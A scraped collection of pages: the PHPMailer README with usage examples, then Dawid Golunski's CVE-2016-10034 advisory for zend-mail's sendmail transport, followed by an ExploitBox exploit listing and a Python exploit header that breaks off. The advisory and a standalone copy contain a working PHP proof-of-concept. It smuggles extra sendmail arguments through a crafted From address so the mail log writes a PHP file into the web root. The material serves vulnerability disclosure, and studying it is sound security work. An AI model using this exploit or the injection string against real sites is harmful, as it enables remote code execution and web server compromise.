[![OpenSSF Scorecard](https://camo.githubusercontent.com/e3aec1b3bdc455e8617e3e3d97c4a3dada7b95dc97106a46b9c2ac1dfd6cdd7f/68747470733a2f2f6170692e736563757269747973636f726563617264732e6465762f70726f6a656374732f6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6261646765)](https://api.securityscorecards.dev/projects/github.com/PHPMailer/PHPMailer)

## Features

* Probably the world's most popular code for sending email from PHP!
* Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! and many more
* Integrated SMTP support ‚Äì send without a local mail server
* Send emails with multiple To, CC, BCC, and Reply-to addresses
* Multipart/alternative emails for mail clients that do not read HTML email
* Add attachments, including inline
* Support for UTF-8 content and 8bit, base64, binary, and quoted-printable encodings
* SMTP authentication with LOGIN, PLAIN, CRAM-MD5, and XOAUTH2 mechanisms over SMTPS and SMTP+STARTTLS transports
* Validates email addresses automatically
* Protects against header injection attacks
* Error messages in over 50 languages!
* DKIM and S/MIME signing support
* Compatible with PHP 5.5 and later, including PHP 8.2
* Namespaced to prevent name clashes
* Much more!

## Why you might need it

Many PHP developers need to send email from their code. The only PHP function that supports this directly is [`mail()`](https://www.php.net/manual/en/function.mail.php). However, it does not provide any assistance for making use of popular features such as encryption, authentication, HTML messages, and attachments.

Formatting email correctly is surprisingly difficult. There are myriad overlapping (and conflicting) standards, requiring tight adherence to horribly complicated formatting and encoding rules ‚Äì the vast majority of code that you'll find online that uses the `mail()` function directly is just plain wrong, if not unsafe!

The PHP `mail()` function usually sends via a local mail server, typically fronted by a `sendmail` binary on Linux, BSD, and macOS platforms, however, Windows usually doesn't include a local mail server; PHPMailer's integrated SMTP client allows email sending on all platforms without needing a local mail server. Be aware though, that the `mail()` function should be avoided when possible; it's both faster and [safer](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) to use SMTP to localhost.

*Please* don't be tempted to do it yourself ‚Äì if you don't use PHPMailer, there are many other excellent libraries that
you should look at before rolling your own. Try [SwiftMailer](https://swiftmailer.symfony.com/)
, [Laminas/Mail](https://docs.laminas.dev/laminas-mail/), [ZetaComponents](https://github.com/zetacomponents/Mail), etc.

## License

This software is distributed under the [LGPL 2.1](https://www.gnu.org/licenses/old-licenses/lgpl-2.1.html) license, along with the [GPL Cooperation Commitment](https://gplcc.github.io/gplcc/). Please read [LICENSE](https://github.com/PHPMailer/PHPMailer/blob/master/LICENSE) for information on the software availability and distribution.

## Installation & loading

PHPMailer is available on [Packagist](https://packagist.org/packages/phpmailer/phpmailer) (using semantic versioning), and installation via [Composer](https://getcomposer.org) is the recommended way to install PHPMailer. Just add this line to your `composer.json` file:

```
"phpmailer/phpmailer": "^6.9.2"
```

or run

```
composer require phpmailer/phpmailer
```

Note that the `vendor` folder and the `vendor/autoload.php` script are generated by Composer; they are not part of PHPMailer.

If you want to use XOAUTH2 authentication, you will also need to add a dependency on the `league/oauth2-client` and appropriate service adapters package in your `composer.json`, or take a look at
by @decomplexity's [SendOauth2 wrapper](https://github.com/decomplexity/SendOauth2), especially if you're using Microsoft services.

Alternatively, if you're not using Composer, you
can [download PHPMailer as a zip file](https://github.com/PHPMailer/PHPMailer/archive/master.zip), (note that docs and examples are not included in the zip file), then copy the contents of the PHPMailer folder into one of the `include_path` directories specified in your PHP configuration and load each class file manually:

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

If you're not using the `SMTP` class explicitly (you're probably not), you don't need a `use` line for the SMTP class. Even if you're not using exceptions, you do still need to load the `Exception` class as it is used internally.

## Legacy versions

PHPMailer 5.2 (which is compatible with PHP 5.0 ‚Äî 7.0) is no longer supported, even for security updates. You will find the latest version of 5.2 in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable). If you're using PHP 5.5 or later (which you should be), switch to the 6.x releases.

### Upgrading from 5.2

The biggest changes are that source files are now in the `src/` folder, and PHPMailer now declares the namespace `PHPMailer\PHPMailer`. This has several important effects ‚Äì [read the upgrade guide](https://github.com/PHPMailer/PHPMailer/tree/master/UPGRADING.md) for more details.

### Minimal installation

While installing the entire package manually or with Composer is simple, convenient, and reliable, you may want to include only vital files in your project. At the very least you will need [src/PHPMailer.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/PHPMailer.php). If you're using SMTP, you'll need [src/SMTP.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/SMTP.php), and if you're using POP-before SMTP (*very* unlikely!), you'll need [src/POP3.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/POP3.php). You can skip the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder if you're not showing errors to users and can make do with English-only errors. If you're using XOAUTH2 you will need [src/OAuth.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/OAuth.php) as well as the Composer dependencies for the services you wish to authenticate with. Really, it's much easier to use Composer!

## A Simple Example

```
<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'user@example.com';                     //SMTP username
    $mail->Password   = 'secret';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
    $mail->addAddress('ellen@example.com');               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    $mail->addCC('cc@example.com');
    $mail->addBCC('bcc@example.com');

    //Attachments
    $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
```

You'll find plenty to play with in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder, which covers many common scenarios including sending through Gmail, building contact forms, sending to mailing lists, and more.

If you are re-using the instance (e.g. when sending to a mailing list), you may need to clear the recipient list to avoid sending duplicate messages. See [the mailing list example](https://github.com/PHPMailer/PHPMailer/blob/master/examples/mailing_list.phps) for further guidance.

That's it. You should now be ready to use PHPMailer!

## Localization

PHPMailer defaults to English, but in the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder, you'll find many translations for PHPMailer error messages that you may encounter. Their filenames contain [ISO 639-1](https://en.wikipedia.org/wiki/ISO_639-1) language code for the translations, for example `fr` for French. To specify a language, you need to tell PHPMailer which one to use, like this:

```
//To load the French version
$mail->setLanguage('fr', '/optional/path/to/language/directory/');
```

We welcome corrections and new languages ‚Äì if you're looking for corrections, run the [Language/TranslationCompletenessTest.php](https://github.com/PHPMailer/PHPMailer/blob/master/test/Language/TranslationCompletenessTest.php) script in the tests folder and it will show any missing translations.

## Documentation

Start reading at the [GitHub wiki](https://github.com/PHPMailer/PHPMailer/wiki). If you're having trouble, head for [the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting) as it's frequently updated.

Examples of how to use PHPMailer for common scenarios can be found in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder. If you're looking for a good starting point, we recommend you start with [the Gmail example](https://github.com/PHPMailer/PHPMailer/tree/master/examples/gmail.phps).

To reduce PHPMailer's deployed code footprint, examples are not included if you load PHPMailer via Composer or via [GitHub's zip file download](https://github.com/PHPMailer/PHPMailer/archive/master.zip), so you'll need to either clone the git repository or use the above links to get to the examples directly.

Complete generated API documentation is [available online](https://phpmailer.github.io/PHPMailer/).

You can generate complete API-level documentation by running `phpdoc` in the top-level folder, and documentation will appear in the `docs` folder, though you'll need to have [PHPDocumentor](https://www.phpdoc.org) installed. You may find [the unit tests](https://github.com/PHPMailer/PHPMailer/blob/master/test/PHPMailer/PHPMailerTest.php) a good reference for how to do various operations such as encryption.

If the documentation doesn't cover what you need, search the [many questions on Stack Overflow](https://stackoverflow.com/questions/tagged/phpmailer), and before you ask a question about "SMTP Error: Could not connect to SMTP host.", [read the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting).

## Tests

[PHPMailer tests](https://github.com/PHPMailer/PHPMailer/tree/master/test/) use PHPUnit 9, with [a polyfill](https://github.com/Yoast/PHPUnit-Polyfills) to let 9-style tests run on older PHPUnit and PHP versions.

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)

If this isn't passing, is there something you can do to help?

## Security

Please disclose any vulnerabilities found responsibly ‚Äì report security issues to the maintainers privately.

See [SECURITY](https://github.com/PHPMailer/PHPMailer/tree/master/SECURITY.md) and [PHPMailer's security advisories on GitHub](https://github.com/PHPMailer/PHPMailer/security).

## Contributing

Please submit bug reports, suggestions, and pull requests to the [GitHub issue tracker](https://github.com/PHPMailer/PHPMailer/issues).

We're particularly interested in fixing edge cases, expanding test coverage, and updating translations.

If you found a mistake in the docs, or want to add something, go ahead and amend the wiki ‚Äì anyone can edit it.

If you have git clones from prior to the move to the PHPMailer GitHub organisation, you'll need to update any remote URLs referencing the old GitHub location with a command like this from within your clone:

```
git remote set-url upstream https://github.com/PHPMailer/PHPMailer.git
```

Please *don't* use the SourceForge or Google Code projects any more; they are obsolete and no longer maintained.

## Sponsorship

Development time and resources for PHPMailer are provided by [Smartmessages.net](https://info.smartmessages.net/), the world's only privacy-first email marketing system.

[![Smartmessages.net privacy-first email marketing logo](https://camo.githubusercontent.com/1c9fac2c126b7258d41730a8c94eabb309db7602733fd88358aa970284c4beca/68747470733a2f2f7777772e736d6172746d657373616765732e6e65742f696d672f736d6172746d657373616765732d6c6f676f2e737667)](https://info.smartmessages.net/)

Donations are very welcome, whether in beer üç∫, T-shirts üëï, or cold, hard cash üí∞. Sponsorship through GitHub is a simple and convenient way to say "thank you" to PHPMailer's maintainers and contributors ‚Äì just click the "Sponsor" button [on the project page](https://github.com/PHPMailer/PHPMailer). If your company uses PHPMailer, consider taking part in Tidelift's enterprise support programme.

## PHPMailer For Enterprise

Available as part of the Tidelift Subscription.

The maintainers of PHPMailer and thousands of other packages are working with Tidelift to deliver commercial
support and maintenance for the open-source packages you use to build your applications. Save time, reduce risk, and
improve code health, while paying the maintainers of the exact packages you
use. [Learn more.](https://tidelift.com/subscription/pkg/packagist-phpmailer-phpmailer?utm_source=packagist-phpmailer-phpmailer&utm_medium=referral&utm_campaign=enterprise&utm_term=repo)

## Changelog

See [changelog](/PHPMailer/PHPMailer/blob/master/changelog.md).

## History

* PHPMailer was originally written in 2001 by Brent R. Matzelle as a [SourceForge project](https://sourceforge.net/projects/phpmailer/).
* [Marcus Bointon](https://github.com/Synchro) (`coolbru` on SF) and Andy Prevost (`codeworxtech`) took over the project in 2004.
* Became an Apache incubator project on Google Code in 2010, managed by Jim Jagielski.
* Marcus created [his fork on GitHub](https://github.com/Synchro/PHPMailer) in 2008.
* Jim and Marcus decide to join forces and use GitHub as the canonical and official repo for PHPMailer in 2013.
* PHPMailer moves to [the PHPMailer organisation](https://github.com/PHPMailer) on GitHub in 2013.

### What's changed since moving from SourceForge?

* Official successor to the SourceForge and Google Code projects.
* Test suite.
* Continuous integration with GitHub Actions.
* Composer support.
* Public development.
* Additional languages and language strings.
* CRAM-MD5 authentication support.
* Preserves full repo history of authors, commits, and branches from the original SourceForge project.

## About

The classic email sending library for PHP

### Topics

[php](/topics/php "Topic: php")
[email](/topics/email "Topic: email")
[php-library](/topics/php-library "Topic: php-library")
[attachment](/topics/attachment "Topic: attachment")
[smtp](/topics/smtp "Topic: smtp")
[phpmailer](/topics/phpmailer "Topic: phpmailer")
[hacktoberfest](/topics/hacktoberfest "Topic: hacktoberfest")
[tls-support](/topics/tls-support "Topic: tls-support")
[xoauth2](/topics/xoauth2 "Topic: xoauth2")

### Resources

[Readme](#readme-ov-file)
### License

[LGPL-2.1 license](#LGPL-2.1-1-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/PHPMailer/PHPMailer/activity)
[Custom properties](/PHPMailer/PHPMailer/custom-properties)
### Stars

[**21.2k**
stars](/PHPMailer/PHPMailer/stargazers)
### Watchers

[**887**
watching](/PHPMailer/PHPMailer/watchers)
### Forks

[**9.7k**
forks](/PHPMailer/PHPMailer/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer&report=PHPMailer+%28user%29)

## [Releases 64](/PHPMailer/PHPMailer/releases)

[PHPMailer 6.9.3
Latest

Nov 24, 2024](/PHPMailer/PHPMailer/releases/tag/v6.9.3)
[+ 63 releases](/PHPMailer/PHPMailer/releases)

## Sponsor this project

* ![patreon](https://github.githubassets.com/assets/patreon-96b15b9db4b9.svg)
  [patreon.com/**marcusbointon**](https://patreon.com/marcusbointon)
* ![tidelift](https://github.githubassets.com/assets/tidelift-8cea37dea8fc.svg)
  [tidelift.com/funding/github/**packagist/phpmailer/phpmailer**](https://tidelift.com/funding/github/packagist/phpmailer/phpmailer)
* <https://marcus.bointon.com/donations/>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/orgs/PHPMailer/packages?repo_name=PHPMailer)

No packages published

## [Used by 101k](/PHPMailer/PHPMailer/network/dependents)

[* ![@DyeanneA9](https://avatars.githubusercontent.com/u/156094788?s=64&v=4)
* ![@wongliyuan](https://avatars.githubusercontent.com/u/92838977?s=64&v=4)
* ![@Webler-Group](https://avatars.githubusercontent.com/u/82103577?s=64&v=4)
* ![@LorennMarque](https://avatars.githubusercontent.com/u/88694990?s=64&v=4)
* ![@TinQ0](https://avatars.githubusercontent.com/u/41490684?s=64&v=4)
* ![@JulioCesarLV1306](https://avatars.githubusercontent.com/u/141194975?s=64&v=4)
* ![@d-rkest](https://avatars.githubusercontent.com/u/164734256?s=64&v=4)
* ![@bobas01](https://avatars.githubusercontent.com/u/67326944?s=64&v=4)

+ 101,295](/PHPMailer/PHPMailer/network/dependents)

## [Contributors 269](/PHPMailer/PHPMailer/graphs/contributors)

[+ 255 contributors](/PHPMailer/PHPMailer/graphs/contributors)

## Languages

* [PHP
  99.4%](/PHPMailer/PHPMailer/search?l=php)
* [Shell
  0.6%](/PHPMailer/PHPMailer/search?l=shell)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from legalhackers.com_d580af35_20250126_083821.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10034
- Release date:  30.12.2016
- Last revision: 30.12.2016
- Revision 1.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

Zend Framework < 2.4.11    Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2

II. BACKGROUND
-------------------------

"Zend Framework is a collection of professional PHP packages with more than 95
million installations. It can be used to develop web applications and
services using PHP 5.6+, and provides 100% object-oriented code using a broad
spectrum of language features.

Zend Framework 3 evolved from both Zend Framework 2 and 1; cumulatively,
the previous versions were downloaded more than 15 million times.

The principal sponsor of Zend Framework is Zend, a Rogue Wave Company, but
many others have contributed components or significant features to the
framework. Companies such as Google, Microsoft, and StrikeIron have
partnered with Zend to provide interfaces to web services and other
technologies they wish to make available to ZF developers."

<https://framework.zend.com/about>

<https://github.com/zendframework/zendframework>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in zend-mail, a
Zend Framework's component that could potentially be used by (unauthenticated)
remote attackers to achieve remote arbitrary code execution in the context
of the web server user and remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the zend-mail class.

Note: This advisory is limited.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

zend-mail component of Zend Framework, suffers from the same vulnerability as
the ones disclosed in PHPMailer and SwiftMailer:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

If a web application based on Zend Framework passes an untrusted input to
setFrom() function of the zend-mail's Sendmail transport, an attacker could
inject additional parameters to Sendmail program.

By injecting an extra sequence of \" after the first argument, the following email:

"Attacker \" -Param2 -Param3"@test.com

when passed to zend-mail's Sendmail transport (and eventually to mail()) function
would cause sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

Zend Framework < 2.4.11    Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2

Discovered/Coded by:

Dawid Golunski
<https://legalhackers.com>

Full Advisory URL:
<http://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html>

Video PoC
<https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html>

Follow the feed for updates:

<https://twitter.com/dawid_golunski>

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-r]
Arg no. 4 == [attacker\]
Arg no. 5 == [-oQ/tmp/]
Arg no. 6 == [-X/var/www/cache/phpcode.php]
Arg no. 7 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender/body fields

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
// encoded phpinfo() php code
$msg_body = base64_decode("PD9waHAgcGhwaW5mbygpOyA/Pg==");

// ------------------

// mail() param injection via the vulnerability in zend-mail

chdir(dirname(__DIR__));
include 'vendor/Zend/Loader/AutoloaderFactory.php';

Zend\Loader\AutoloaderFactory::factory(array(
        'Zend\Loader\StandardAutoloader' => array(
                'autoregister_zf' => true
        )
));

Zend\Mvc\Application::init(require 'config/application.php')->run();

$message        = new \Zend\Mail\Message();

$message->setBody($msg_body);
$message->setFrom($email_from, 'Attacker');
$message->addTo('support@localhost', 'Support');
$message->setSubject('Zend PoC');

$transport  = new \Zend\Mail\Transport\Sendmail();
$transport->send($message);

~~~~~~~~~~~

More advanced exploit targetting a contact form can be found at:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html>

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

The patch resolving the vulnerability is available in:

zend-mail, starting in version 2.7.2
zend-mail, 2.4.11
Zend Framework, 2.4.11

VIII. SOLUTION / VENDOR RESPONSE
-------------------------

Update to the latest versions that contain the patch.

<https://framework.zend.com/security/advisory/ZF2016-04>

IX. REFERENCES
-------------------------

<https://legalhackers.com>

This / CVE-2016-10034 advisory URL:
<https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html>

Video PoC exploit:
<https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html>
<https://www.youtube.com/watch?v=xyYMYvT2bx8>

Exploit code:
The simple PoC shown above is available here:
<https://legalhackers.com/exploits/CVE-2016-10034/zend-mail_PoC_RCE_Exploit.txt>

Combined exploit code for multiple targets:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.

The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
<https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html>

CVE-2016-10034
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10034>

Vendor site:
<https://framework.zend.com>

Related vulnerabilities (found in PHPMailer & SwiftMailer):

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>
<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

Thanks to Beyond Security for help with the disclosure

XI. REVISION HISTORY
-------------------------

30.12.2016 - Limited advisory released

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```


=== Content from ExploitBox.io_c920f1bc_20250126_083818.html ===


[Brand
![](assets/img/logo.png)](index.html)

# ExploitBox is a playground & labs for Hackers, Bug Hunters, Researchers & other security folks.

Created by [@dawid\_golunski](https://twitter.com/%40dawid_golunski) [ [Legal Hackers](https://legalhackers.com) ].

It's all about the **art of exploitation**. To **learn**, **share**, and **pwn**.

**Subscribe** to get notified about the **launch** and get started from **day 0**.

Subscribe

![](assets/img/page-intro-img.png)

**COMING SOON** **‚ñà**

bash: no job control in this shell

[‚ñ™ ¬† WordPress 4.6 RCE exploit](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)

[Git Git-LFS RCE Exploit CVE-2020-27955](https://ExploitBox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html)
[‚ñ™ ¬† Visual Studio Code RCE Exploit CVE-2020-27955 (git-lfs)](https://ExploitBox.io/vuln/VisualStudioCode-VS-Git-LFS-RCE-Exploit-CVE-2020-27955.html)
[‚ñ™ ¬† GitKraken Git-LFS RCE Exploit CVE-2020-27955](https://ExploitBox.io/vuln/GitKraken-Git-LFS-RCE-Exploit-CVE-2020-27955.html)
[‚ñ™ ¬† GitHub Desktop Git-LFS RCE Exploit CVE-2020-27955](https://ExploitBox.io/vuln/GitHub-Desktop-Git-LFS-RCE-Exploit-CVE-2020-27955.html)
[‚ñ™ ¬† SmartGit Git-LFS RCE Exploit CVE-2020-27955](https://exploitbox.io/vuln/SmartGit-Git-LFS-RCE-Exploit-CVE-2020-27955.html)
[‚ñ™ ¬† SourceTree RCE Exploit CVE-2020-27955 (git-lfs)](https://exploitbox.io/vuln/SourceTree-Git-LFS-RCE-Exploit-CVE-2020-27955.html)
[‚ñ™ ¬† WordPress 4.7 Pass Reset 0day](https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html)
[‚ñ™ ¬† Vanilla Core RCE 0day](https://exploitbox.io/vuln/Vanilla-Forums-Exploit-RCE-0day-Remote-Code-Exec-CVE-2016-10033.html)
[‚ñ™ ¬† Vanilla Core 2.3 Header Injection](https://exploitbox.io/vuln/Vanilla-Forums-Exploit-Host-Header-Injection-CVE-2016-10073-0day.html)
[‚ñ™ ¬† Pwning PHP mail() function For Fun And RCE](//exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

¬©ExploitBox All rights reserved.



=== Content from legalhackers.com_779129e6_20250126_083808.html ===
php
/\*
Zend Framework < 2.4.11 Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2
Discovered/Coded by:
Dawid Golunski
https://legalhackers.com
Full Advisory URL:
http://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html
Video PoC
https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html
Follow the feed for updates:
https://twitter.com/dawid\_golunski
A simple PoC (working on Sendmail MTA)
It will inject the following parameters to sendmail command:
Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-r]
Arg no. 4 == [attacker\]
Arg no. 5 == [-oQ/tmp/]
Arg no. 6 == [-X/var/www/cache/phpcode.php]
Arg no. 7 == ["@email.com]
which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.
The resulting file will contain the payload passed in the body of the msg:
09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?
09607 <<<
09607 <<<
09607 <<<
See the full advisory URL for the exploit details.
\*/
// Attacker's input coming from untrusted source such as $\_GET , $\_POST etc.
// For example from a Contact form with sender field
$email\_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
// encoded phpinfo() php code
$msg\_body = base64\_decode("PD9waHAgcGhwaW5mbygpOyA/Pg==");
// ------------------
// mail() param injection via the vulnerability in zend-mail
chdir(dirname(\_\_DIR\_\_));
include 'vendor/Zend/Loader/AutoloaderFactory.php';
Zend\Loader\AutoloaderFactory::factory(array(
'Zend\Loader\StandardAutoloader' => array(
'autoregister\_zf' => true
)
));
Zend\Mvc\Application::init(require 'config/application.php')->run();
$message = new \Zend\Mail\Message();
$message->setBody($msg\_body);
$message->setFrom($email\_from, 'Attacker');
$message->addTo('support@localhost', 'Support');
$message->setSubject('Zend PoC');
$transport = new \Zend\Mail\Transport\Sendmail();
$transport->send($message);


=== Content from raw.githubusercontent.com_7789922f_20250126_083820.html ===
#!/usr/bin/python
#
# Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA]
# Date: [16/06/2017]
# Exploit Author: [@phackt\_ul]
# Software Link: [https://github.com/PHPMailer/PHPMailer]
# Version: [< 5.2.20]
# Tested on: [Debian x86/x64]
# CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045]
#
# @phackt\_ul - https://phackt.com
#
# All credits go to Dawid Golunski (@dawid\_golunski) - https://legalhackers.com
# and its research on PHP libraries vulns
#
# PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
# PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
